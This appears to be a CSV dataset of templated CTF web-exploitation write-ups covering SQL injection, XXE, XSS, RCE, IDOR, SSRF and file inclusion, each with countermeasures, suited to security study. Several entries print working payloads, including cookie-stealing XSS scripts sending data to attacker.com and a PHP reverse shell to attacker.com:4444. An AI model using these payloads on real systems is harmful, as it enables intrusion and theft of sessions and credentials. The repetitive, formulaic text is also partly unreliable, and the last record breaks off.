"filename","category","text"
"writeup_0001_tagged.txt","Web Exploitation","Title: SQL Injection in Login Form to Bypass Authentication
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: None

#context
During a CTF competition, I encountered a web application that used a login form to authenticate users. After inspecting the login form's source code, I noticed that it was vulnerable to SQL injection, a common vulnerability that allows attackers to manipulate SQL queries and execute unauthorized actions on the database.

#discovery
To test for a possible SQL injection vulnerability, I crafted an input containing malicious SQL code, such as ' or 1=1 --. If the application executed the SQL code and granted me access to the application, it would confirm the presence of a SQL injection vulnerability.

#exploitation
Upon submitting the crafted input to the login form, the web application indeed executed the SQL code and granted me access to the application, bypassing the authentication mechanism. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL injection vulnerability to extract data from the database.

#code
`' or 1=1 --`

#exploitation
After crafting a suitable payload, I submitted it to the login form, which executed the SQL code and returned sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of securing web applications against SQL injection vulnerabilities by validating and sanitizing user input, using prepared statements or parameterized queries, and restricting the privileges of database users. By exploiting the SQL injection vulnerability, I was able to bypass authentication, extract sensitive data, and obtain the flag needed to complete the challenge.
"
"writeup_0002_tagged.txt","Web Exploitation","Title: XXE Injection to Access Server Files
Primary topic: Web Exploitation
Secondary topic: XXE Injection
Tools used: None
Keywords: XML parsing, external entity, file system access

#context
During a CTF competition, I encountered a web application that parsed XML input and displayed the results to the user. Given the nature of XML parsing and processing, I suspected that the application might be vulnerable to XML External Entity (XXE) injection, a type of vulnerability that allows attackers to read arbitrary files on the server or execute remote requests.

#discovery
To test for XXE injection, I crafted an XML input containing a reference to an external entity, such as <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> <root>&xxe;</root>. If the application parsed the input and displayed the contents of the passwd file, it would confirm the presence of an XXE injection vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed displayed the contents of the passwd file, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XXE injection vulnerability to read a specific file on the server. After crafting a suitable payload and choosing the target file, I submitted the input to the application, which executed the XXE injection and displayed the contents of the file, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XXE injection vulnerabilities by validating and sanitizing XML input, disabling external entity references, and restricting file system access. By exploiting the XXE injection vulnerability, I was able to read arbitrary files on the server, extract sensitive data, and obtain the flag needed to complete the challenge.

#code
<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> <root>&xxe;</root>
"
"writeup_0003_tagged.txt","Web Exploitation","Title: Remote Code Execution via File Upload
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution
Tools used: None
Keywords: file upload, PHP web shell

#context
During a CTF competition, I encountered a web application that allowed users to upload files, such as images or documents, to the server. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server.

#discovery
To test for RCE, I crafted a malicious file containing executable code, such as a PHP web shell, and uploaded it to the server. If the application executed the code and granted me remote access to the server, it would confirm the presence of an RCE vulnerability.

#exploitation
Upon submitting the malicious file to the application, it indeed executed the code and granted me remote access to the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary commands on the server. After uploading a suitable payload, I executed the commands and obtained sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of securing web applications against file upload vulnerabilities by validating and sanitizing file types and content, setting proper file permissions, and restricting file system access. By exploiting the RCE vulnerability, I was able to execute arbitrary commands on the server, access sensitive data, and obtain the flag needed to complete the challenge.
"
"writeup_0004_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack to Steal Cookies
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, user input, malicious scripts

#context
During a CTF competition, I encountered a web application that displayed user input without properly validating and sanitizing it, making it vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

#discovery
To test for XSS, I crafted a benign script, such as <script>alert('XSS')</script>, and submitted it to the application. If the application displayed the script and executed it in the context of another user, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed displayed the script and executed it in the context of another user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of another user. After crafting a suitable payload, I submitted it to the application, which executed the XSS attack and stole the session cookie of another user, allowing me to access their account and obtain the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, encoding output to prevent script injection, and using HTTP-only session cookies. By exploiting the XSS vulnerability, I was able to steal session cookies, access user accounts, and obtain the flag needed to complete the challenge.
"
"writeup_0005_tagged.txt","Web Exploitation","Title: SQL Injection in Login Form
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQL queries, authentication, database, payload, parameterized queries, user input, sensitive data, flag

#context
During a CTF competition, I encountered a web application that used SQL queries to authenticate users and grant access to restricted content. Given the potential security risks associated with SQL queries, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to manipulate SQL queries to perform unauthorized actions on the database.

#discovery
To test for SQL Injection, I crafted a malicious input containing SQL code, such as ' OR 1=1;--, and submitted it to the application's login form. If the application allowed me to bypass authentication and gain access to restricted content, it would confirm the presence of an SQL Injection vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed bypassed authentication and granted me access to restricted content, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive data from the database.

#code
' OR 1=1;--,

#exploitation
After crafting a suitable payload and choosing the target data, I submitted the input to the application, which executed the SQL Injection and displayed the sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by using parameterized queries, validating and sanitizing user input, and restricting database access. By exploiting the SQL Injection vulnerability, I was able to manipulate SQL queries, bypass authentication, access sensitive data, and obtain the flag needed to complete the challenge.
"
"writeup_0006_tagged.txt","Web Exploitation","Title: Insecure Direct Object Reference (IDOR) Attack to Access Sensitive Data
Primary topic: Web Exploitation
Secondary topic: Insecure Direct Object Reference (IDOR)
Tools used: None
Keywords: access control, object references, input validation, sanitization

#context
During a CTF competition, I encountered a web application that displayed sensitive data without proper access control, making it vulnerable to Insecure Direct Object Reference (IDOR), a type of vulnerability that allows attackers to manipulate object references to access unauthorized data.

#discovery
To test for IDOR, I browsed the application's pages and observed the data displayed for each user. Upon noticing a pattern in the data's structure and IDs, I crafted a URL containing the ID of another user, such as http://example.com/user?id=2, and submitted it to the application. If the application displayed the sensitive data of the target user, it would confirm the presence of an IDOR vulnerability.

#exploitation
Upon submitting the crafted URL to the application, it indeed displayed the sensitive data of the target user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the IDOR vulnerability to access the sensitive data of a privileged user. After browsing the application and identifying a privileged user, I crafted a suitable URL containing their ID and submitted it to the application, which displayed their sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against IDOR vulnerabilities by enforcing proper access control, using randomized and unpredictable object references, and performing input validation and sanitization. By exploiting the IDOR vulnerability, I was able to manipulate object references, access unauthorized data, and obtain the flag needed to complete the challenge.
"
"writeup_0007_tagged.txt","Web Exploitation","Title: Remote Code Execution (RCE) Attack via File Upload
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution
Tools used: None
Keywords: file upload, PHP code, web shell, payload, command execution

#context
During a CTF competition, I encountered a web application that allowed users to upload and manage files. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server.

#discovery
To test for RCE, I crafted a malicious file containing PHP code, such as a web shell, and uploaded it to the application. If the application allowed me to execute the code and obtain remote access to the server, it would confirm the presence of an RCE vulnerability.

#exploitation
Upon uploading the crafted file to the application, it indeed allowed me to execute the PHP code and obtain remote access to the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute a specific command on the server.

#code
`After researching the server's configuration and available commands, I crafted a suitable payload containing the desired command and uploaded it to the application, which executed the command and displayed the flag for the Web Exploitation challenge.`

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against RCE vulnerabilities by validating and sanitizing user input, using file type validation and content inspection, and restricting file permissions and execution. By exploiting the RCE vulnerability, I was able to execute arbitrary code, obtain remote access to the server, and obtain the flag needed to complete the challenge.
"
"writeup_0008_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack via Form Input
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: form input, session cookie

#context
During a CTF competition, I encountered a web application that allowed users to submit feedback through a form. Given the potential security risks associated with form input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject and execute malicious scripts in the user's browser.

#discovery
To test for XSS, I crafted a malicious input containing a script, such as <script>alert('XSS');</script>, and submitted it to the application's form. If the application allowed the script to execute and display the alert message, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed executed the script and displayed the alert message, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate them. After crafting a suitable payload containing a script to steal the session cookie, I submitted it to the application's form. The script successfully executed and sent the user's session cookie to a remote server controlled by me, allowing me to impersonate the user and obtain the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, using content security policies, and implementing input/output encoding. By exploiting the XSS vulnerability, I was able to inject and execute malicious scripts, steal sensitive information, and obtain the flag needed to complete the challenge.

#code
<script>alert('XSS');</script>
"
"writeup_0009_tagged.txt","Web Exploitation","Title: Server-Side Request Forgery (SSRF) Attack via URL Parameter
Primary topic: Web Exploitation
Secondary topic: Server-Side Request Forgery (SSRF)
Tools used: None
Keywords: URL parameter, vulnerable server, restricted resource

#context
During a CTF competition, I encountered a web application that allowed users to fetch and display web pages by specifying a URL parameter. Given the potential security risks associated with URL parameters, I suspected that the application might be vulnerable to Server-Side Request Forgery (SSRF), a type of vulnerability that allows attackers to manipulate and send unauthorized requests from the server.

#discovery
To test for SSRF, I crafted a malicious URL containing a request to a vulnerable server, such as http://vulnerable-server.com/admin, and submitted it to the application's URL parameter. If the application allowed the request to execute and display the vulnerable server's response, it would confirm the presence of an SSRF vulnerability.

#exploitation
Upon submitting the crafted URL to the application, it indeed sent the request to the vulnerable server and displayed its response, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SSRF vulnerability to access a restricted resource on the server.

#code
None

#exploitation
After researching the server's configuration and available resources, I crafted a suitable URL containing the desired resource and submitted it to the application's URL parameter. The server successfully executed the request and displayed the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SSRF vulnerabilities by validating and sanitizing user input, using input/output encoding, and implementing white-listing and blacklisting techniques. By exploiting the SSRF vulnerability, I was able to manipulate and send unauthorized requests from the server, access restricted resources, and obtain the flag needed to complete the challenge.
"
"writeup_0010_tagged.txt","Web Exploitation","Title: SQL Injection in Login Functionality
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: login functionality, SQL commands, database, payload, input/output encoding

#context
During a CTF competition, I encountered a web application that allowed users to login to a protected area by submitting their credentials through a login form. Given the potential security risks associated with login functionality, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to inject and execute malicious SQL commands in the application's database.

#discovery
To test for SQL Injection, I crafted a malicious input containing SQL commands, such as 1' or '1'='1, and submitted it to the application's login form. If the application allowed the input to execute and bypass the login authentication, it would confirm the presence of an SQL Injection vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed executed the SQL command and bypassed the login authentication, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the application's database.

#code
`1' or '1'='1`

#exploitation
After researching the database's structure and available data, I crafted a suitable payload containing SQL commands to extract the desired information and submitted it to the application's login form. The server successfully executed the commands and displayed the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by validating and sanitizing user input, using parameterized queries, and implementing input/output encoding. By exploiting the SQL Injection vulnerability, I was able to inject and execute malicious SQL commands, bypass authentication, extract sensitive information, and obtain the flag needed to complete the challenge.
"
"writeup_0011_tagged.txt","Web Exploitation","Title: Remote File Inclusion (RFI) Attack via URL Parameter
Primary topic: Web Exploitation
Secondary topic: Remote File Inclusion (RFI)
Tools used: None
Keywords: URL parameter, malicious file, server configuration, input validation, input/output encoding, whitelisting, blacklisting

#context
During a CTF competition, I encountered a web application that allowed users to display and download files by specifying a URL parameter. Given the potential security risks associated with URL parameters, I suspected that the application might be vulnerable to Remote File Inclusion (RFI), a type of vulnerability that allows attackers to include and execute external files on the server.

#discovery
To test for RFI, I crafted a malicious URL containing a reference to an external file, such as http://malicious-server.com/malicious.php, and submitted it to the application's URL parameter. If the application allowed the file to be included and executed on the server, it would confirm the presence of an RFI vulnerability.

#exploitation
Upon submitting the crafted URL to the application, it indeed included and executed the malicious file on the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RFI vulnerability to access and execute a specific file on the server. After researching the server's configuration and available files, I crafted a suitable URL containing the desired file and submitted it to the application's URL parameter. The server successfully included and executed the file, displaying the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against RFI vulnerabilities by validating and sanitizing user input, using whitelisting and blacklisting techniques, and implementing input/output encoding. By exploiting the RFI vulnerability, I was able to include and execute external files on the server, access restricted files, and obtain the flag needed to complete the challenge.
"
"writeup_0012_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack via Form Input
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: form input, client-side

#context
During a CTF competition, I encountered a web application that allowed users to submit information through a form input and display it on a public page. Given the potential security risks associated with form input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject and execute malicious scripts on the client-side.

#discovery
To test for XSS, I crafted a malicious input containing a script tag, such as <script>alert('XSS')</script>, and submitted it to the application's form input. If the application allowed the script to be injected and executed on the client-side, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed injected and executed the malicious script on the client-side, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to execute a specific script on the client-side. After researching the application's structure and available resources, I crafted a suitable payload containing a script to extract the desired information and submitted it to the application's form input. The client successfully executed the script and displayed the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, using input/output encoding, and implementing white-listing and blacklisting techniques. By exploiting the XSS vulnerability, I was able to inject and execute malicious scripts on the client-side, access sensitive information, and obtain the flag needed to complete the challenge.

#code
<script>alert('XSS')</script>
"
"writeup_0013_tagged.txt","Web Exploitation","Title: Insecure Direct Object Reference (IDOR) Attack via User Profile
Primary topic: Web Exploitation
Secondary topic: Insecure Direct Object Reference (IDOR)
Tools used: None
Keywords: user data, direct object reference

#context
During a CTF competition, I encountered a web application that allowed users to view and edit their profile information through a dedicated page. Given the potential security risks associated with user data, I suspected that the application might be vulnerable to Insecure Direct Object Reference (IDOR), a type of vulnerability that allows attackers to access and modify sensitive data by manipulating direct object references.

#discovery
To test for IDOR, I crafted a malicious request containing a direct object reference to another user's profile, such as http://website.com/profile?id=2, and submitted it to the application's user profile page. If the application allowed the request to access and modify the other user's sensitive information, it would confirm the presence of an IDOR vulnerability.

#exploitation
Upon submitting the crafted request to the application, it indeed accessed and displayed the other user's sensitive information, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the IDOR vulnerability to access and display a specific user's private data. After researching the application's structure and available resources, I crafted a suitable request containing a direct object reference to the desired user's profile and submitted it to the application's user profile page. The server successfully responded with the desired user's sensitive information, displaying the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against IDOR vulnerabilities by implementing proper authorization and authentication controls, using indirect object references, and performing access controls on sensitive data. By exploiting the IDOR vulnerability, I was able to access and modify sensitive data, obtain confidential information, and complete the Web Exploitation challenge.
"
"writeup_0014_tagged.txt","Web Exploitation","Title: Broken Authentication and Session Management via Cookie Manipulation
Primary topic: Web Exploitation
Secondary topic: Broken Authentication and Session Management
Tools used: None
Keywords: cookies, user authentication, session management

#context
During a CTF competition, I encountered a web application that used cookies to manage user authentication and session management. Given the potential security risks associated with cookies, I suspected that the application might be vulnerable to Broken Authentication and Session Management, a type of vulnerability that allows attackers to bypass authentication and hijack user sessions by manipulating cookies.

#discovery
To test for Broken Authentication and Session Management, I crafted a malicious request containing a manipulated cookie with an arbitrary user ID, such as Cookie: user_id=123, and submitted it to the application's login page. If the application allowed the request to bypass authentication and log in as the arbitrary user, it would confirm the presence of a Broken Authentication and Session Management vulnerability.

#exploitation
Upon submitting the crafted request to the application, it indeed bypassed authentication and logged in as the arbitrary user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the Broken Authentication and Session Management vulnerability to hijack the session of a specific user.

#exploitation
After researching the application's structure and available resources, I crafted a suitable cookie with the session ID of the desired user and submitted it to the application. The server successfully recognized the hijacked session and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Broken Authentication and Session Management vulnerabilities by implementing proper session management controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to bypass authentication, hijack user sessions, and complete the Web Exploitation challenge.
"
"writeup_0015_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack via Contact Form
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, input validation, output encoding

#context
During a CTF competition, I encountered a web application that allowed users to contact the website administrators via a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into web pages viewed by other users.

#discovery
To test for XSS, I crafted a malicious payload containing a script that would steal the victim's session cookie, such as <script>new Image().src=""http://attacker.com/cookie?=""+document.cookie;</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and steal the victim's session cookie, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and stole the victim's session cookie, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to execute a script that would display the flag.

#code
`<script>new Image().src=""http://attacker.com/cookie?=""+document.cookie;</script>`

#exploitation
After researching the application's structure and available resources, I crafted a suitable payload containing a script that would display the flag and submitted it to the application's contact form. The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0016_tagged.txt","Web Exploitation","Title: Directory Traversal Attack on File Upload Functionality
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: file upload, payload, path traversal

#context
During a CTF competition, I encountered a web application that allowed users to upload files to the server. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Directory Traversal, a type of vulnerability that allows attackers to access files outside of the intended upload directory.

#discovery
To test for Directory Traversal, I crafted a malicious payload containing a path traversal sequence, such as ../, and appended it to the filename of a file that I wanted to upload, such as ../../../etc/passwd.

#exploitation
If the application allowed the payload to execute and upload the file to the server outside of the intended upload directory, it would confirm the presence of a Directory Traversal vulnerability. Upon submitting the crafted payload to the application, it indeed executed and uploaded the file to the server outside of the intended upload directory, confirming the vulnerability.

#discovery
To obtain the flag for the Web Exploitation challenge, I needed to use the Directory Traversal vulnerability to access a specific file on the server. After researching the server's file structure, I crafted a suitable payload containing the path to the desired file, such as ../../../flag.txt, and submitted it to the application's file upload functionality.

#exploitation
The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Directory Traversal vulnerabilities by implementing proper file upload controls, using secure file paths, and validating user input. By exploiting the vulnerability, I was able to access sensitive files, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0017_tagged.txt","Web Exploitation","Title: SQL Injection in Login Functionality
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: user input, payload, authentication, database

#context
During a CTF competition, I encountered a web application that allowed users to login to the system. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to manipulate SQL queries executed by the application.

#discovery
To test for SQL Injection, I crafted a malicious payload containing a SQL Injection attack string, such as ' OR 1=1 --, and submitted it to the application's login form. If the application allowed the payload to execute and bypassed the authentication process, it would confirm the presence of a SQL Injection vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and bypassed the authentication process, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the database.

#code
' OR 1=1 --

#exploitation
After researching the application's database structure and available resources, I crafted a suitable payload containing a SQL Injection attack string that would extract the flag from the database, such as ' UNION SELECT flag FROM flags --. The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by implementing proper input validation and output encoding controls, using parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0018_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack on Contact Form
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: user input, payload

#context
During a CTF competition, I encountered a web application that allowed users to send messages to the site administrator through a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious scripts into a web page viewed by other users.

#discovery
To test for XSS, I crafted a malicious payload containing a JavaScript script, such as <script>alert(""XSS Attack!"")</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and display the JavaScript script to other users, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and displayed the JavaScript script to other users, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user.

#code
<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>

#exploitation
After researching the application's session management and cookie handling, I crafted a suitable payload containing a JavaScript script that would extract the session cookie from a logged-in user, such as <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>. The server successfully recognized the payload and responded with the session cookie for the logged-in user.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookie handling, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0019_tagged.txt","Web Exploitation","Title: Broken Authentication and Session Management Attack
Primary topic: Web Exploitation
Secondary topic: Broken Authentication and Session Management
Tools used: None
Keywords: session ID, authentication, cookie handling

#context
During a CTF competition, I encountered a web application that allowed users to login to the system and manage their profiles. Given the potential security risks associated with user authentication and session management, I suspected that the application might be vulnerable to Broken Authentication and Session Management, a type of vulnerability that allows attackers to bypass authentication and hijack user sessions.

#discovery
To test for Broken Authentication and Session Management, I crafted a malicious payload containing a tampered session ID, such as 1234567890abcdef, and submitted it to the application's login form. If the application allowed the payload to execute and bypassed the authentication process, it would confirm the presence of a Broken Authentication and Session Management vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and bypassed the authentication process, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the Broken Authentication and Session Management vulnerability to hijack the session of a logged-in user. After researching the application's session management and cookie handling, I crafted a suitable payload containing a tampered session ID that would hijack the session of a logged-in user, such as Cookie: PHPSESSID=1234567890abcdef. The server successfully recognized the payload and responded with the session of the logged-in user.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Broken Authentication and Session Management vulnerabilities by using secure session management, implementing proper authentication controls, and validating user input. By exploiting the vulnerability, I was able to bypass authentication, hijack user sessions, and complete the Web Exploitation challenge.
"
"writeup_0020_tagged.txt","Web Exploitation","Title: Remote Code Execution (RCE) Attack on a Web Server
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution
Tools used: None
Keywords: file uploads, PHP script, Linux command, reverse shell

#context
During a CTF competition, I encountered a vulnerable web application that allowed users to upload files to the server.

#discovery
Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute code on a remote server.

#exploitation
To test for RCE, I crafted a malicious payload containing a PHP script that would execute the Linux command ls -la and save the output to a file. I then uploaded the file to the application's server and waited for it to execute. Upon checking the application's upload directory, I found that the output.txt file had been created and contained the expected output of the ls -la command. This confirmed the presence of an RCE vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute a reverse shell on the remote server. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell script that would allow me to connect to the server and gain remote access.

#code
<?php echo shell_exec('ls -la > /var/www/html/uploads/output.txt'); ?>
<?php system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); ?>

#discovery
After executing the payload, I successfully gained a remote shell on the server and was able to complete the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using secure file uploads, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the remote server, gain remote access, and complete the Web Exploitation challenge.
"
"writeup_0021_tagged.txt","Web Exploitation","Title: SQL Injection in Search Feature
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: user input, database, payload

#context
During a CTF competition, I encountered a web application that included a search feature allowing users to search for content on the website. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to inject SQL code into a query and manipulate the database.

#discovery
To test for SQL Injection, I entered a malicious payload containing SQL code into the search box, such as ' or 1=1;--, which would cause the application to return all results, regardless of the input. Upon submitting the payload, the application returned all results, confirming the presence of an SQL Injection vulnerability.

#exploitation
To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the database. After researching the application's database structure and table names, I crafted a suitable payload containing SQL code that would extract sensitive information from the database, such as UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users';. This payload allowed me to identify the names of columns in the 'users' table, such as 'username' and 'password', which contained the sensitive information. Using the obtained column names, I crafted a second payload containing SQL code that would extract the usernames and passwords of all users in the 'users' table, such as UNION SELECT username, password FROM users;. This payload allowed me to obtain the sensitive information required to complete the Web Exploitation challenge.

#code
`' or 1=1;--`

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by implementing proper input validation and output encoding controls, using prepared statements and parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information from the database, complete the Web Exploitation challenge, and demonstrate the potential risks associated with SQL Injection.
"
"writeup_0022_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack on a Web Application
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, input validation, output encoding, Content Security Policy (CSP)

#context
During a CTF competition, I encountered a web application that included a search feature allowing users to search for content on the website. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into a web page and manipulate user data.

#discovery
To test for XSS, I entered a malicious payload containing JavaScript code into the search box, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript code and display an alert box containing the text 'XSS'. Upon submitting the payload, the application executed the JavaScript code, confirming the presence of an XSS vulnerability.

#exploitation
To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user. After researching the application's system and network configuration, I crafted a suitable payload containing JavaScript code that would steal the session cookie of a logged-in user and send it to an attacker-controlled server, such as <script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>. This payload allowed me to obtain the session cookie of a logged-in user, which I could then use to impersonate the user and complete the Web Exploitation challenge.

#code
<script>alert('XSS');</script>
<script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Cross-Site Scripting vulnerabilities by implementing proper input validation and output encoding controls, using Content Security Policy (CSP), and validating user input. By exploiting the vulnerability, I was able to steal the session cookie of a logged-in user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS.
"
"writeup_0023_tagged.txt","Web Exploitation","Title: File Inclusion Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: File Inclusion
Tools used: None
Keywords: path traversal, payload, PHP code, input validation, output encoding, whitelisting, user input

#context
During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include external files into the application. Given the potential security risks associated with including user-provided files, I suspected that the application might be vulnerable to File Inclusion vulnerability, a type of vulnerability that allows attackers to include malicious files and execute arbitrary code.

#discovery
To test for File Inclusion, I entered a malicious payload containing a path traversal sequence into the file inclusion parameter, such as ../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server.

#exploitation
